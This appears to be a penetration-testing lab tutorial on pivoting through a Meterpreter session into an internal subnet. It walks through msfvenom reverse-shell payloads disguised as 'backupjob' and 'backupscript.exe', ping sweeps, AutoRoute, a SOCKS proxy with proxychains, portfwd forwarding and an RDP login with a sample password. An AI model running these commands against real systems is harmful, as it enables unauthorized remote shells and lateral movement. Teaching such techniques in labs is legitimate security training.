# Meterpreter Tunneling & Port Forwarding

Meterpreter sessions offer a self-contained pivoting capability that removes the dependency on SSH being available or accessible. Once a Meterpreter session is established on a dual-homed pivot host, the entire Metasploit routing engine and proxychains can be configured to push traffic into otherwise unreachable network segments.

## Establishing a Meterpreter Session on the Pivot Host

The first step is generating a Linux Meterpreter payload for the Ubuntu server and setting up a listener:

```bash
# Generate the payload
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080

# Start the listener in Metasploit
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
```

Copy the binary to the Ubuntu server over SCP, make it executable, and run it:

```bash
# On the Ubuntu pivot host
chmod +x backupjob
./backupjob
```

Once the Meterpreter session opens, the Ubuntu server's dual-homed interfaces (`10.129.202.64` on ens192 and `172.16.5.129` on ens224) confirm it is a valid pivot point into the `172.16.5.0/23` network.

## Ping Sweep Through Meterpreter

Before routing full tool traffic, host discovery identifies which internal hosts are alive. Meterpreter provides a built-in post module for this:

```bash
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

If the post module is not available or ICMP is blocked, the same result can be achieved with shell one-liners executed directly on the pivot host:

```bash
# Linux pivot host
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done

# Windows pivot host (CMD)
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

# Windows pivot host (PowerShell)
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

It is worth running ping sweeps twice -- the first pass builds the ARP cache on the pivot host, and the second pass tends to return more complete results.

## Configuring Metasploit's SOCKS Proxy and AutoRoute

To route traffic from external tools like Nmap through the Meterpreter session, two components need to be configured: AutoRoute to teach Metasploit which subnets to reach through the session, and the socks_proxy module to expose that routing capability as a SOCKS proxy that proxychains can use.

```bash
# Step 1 -- Add routes via AutoRoute
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
msf6 post(multi/manage/autoroute) > run
```

AutoRoute reads the pivot host's own routing table and adds routes automatically. Alternatively, from inside the Meterpreter session:

```bash
meterpreter > run autoroute -s 172.16.5.0/23

# Verify active routes
meterpreter > run autoroute -p
```

The active routing table output confirms routes for `10.129.0.0`, `172.16.4.0`, and `172.16.5.0` are all pointing through Session 1.

```bash
# Step 2 -- Start the SOCKS proxy
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
msf6 auxiliary(server/socks_proxy) > run
```

This starts the proxy as a background job. Confirm it is running:

```bash
msf6 auxiliary(server/socks_proxy) > jobs
```

Ensure `/etc/proxychains.conf` has the correct entry at the bottom:

```
socks4  127.0.0.1 9050
```

Depending on the SOCKS version configured, this may need to read `socks5` instead. With this in place, any tool prefixed with proxychains routes its TCP traffic through Metasploit's internal routing table and out through the Meterpreter session:

```bash
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

The proxychains output shows each connection attempt routing through `127.0.0.1:9050` before reaching `172.16.5.19:3389`.

## Meterpreter portfwd -- Local Port Forward

The `portfwd` module within Meterpreter provides direct port forwarding without needing proxychains at all. It binds a local listener on the attack host and relays connections to a specific destination through the Meterpreter session:

```bash
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

This creates a listener on the attack host's port 3300 that forwards all traffic to `172.16.5.19:3389` via the Meterpreter tunnel. Connecting to localhost:3300 is now functionally identical to connecting to the Windows host's RDP port directly:

```bash
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

Running `netstat -antp` on the attack host confirms the established xfreerdp session connecting to the local forward:

```
tcp   0   0 127.0.0.1:54652   127.0.0.1:3300   ESTABLISHED 4075/xfreerdp
```

## Meterpreter portfwd -- Reverse Port Forward

The reverse variant of `portfwd` solves the same callback routing problem covered in the SSH remote port forwarding section. It instructs the pivot host to listen on a port and forward all incoming connections back to the attacker's machine.

```bash
# Inside the Meterpreter session on Ubuntu
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

Breaking down the flags:
- `-R` -- reverse mode
- `-l 8081` -- the local port on the attack host where connections will be delivered
- `-p 1234` -- the port the Ubuntu pivot host will listen on
- `-L 10.10.14.18` -- the attack host IP where connections are forwarded to

Background the session and configure the listener on port 8081:

```bash
meterpreter > bg
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
msf6 exploit(multi/handler) > run
```

Generate a Windows payload pointing back to the Ubuntu server at port 1234:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```

When the Windows host executes this payload, it connects to `172.16.5.129:1234`. The Ubuntu server receives that connection and forwards it through the Meterpreter tunnel to the attacker's machine at port 8081, where the listener is waiting. The resulting session shows as `10.10.14.18:8081 -> 10.10.14.18:40173` for the same reason as with SSH remote forwarding -- traffic arrives through the local tunnel rather than directly from the Windows host.
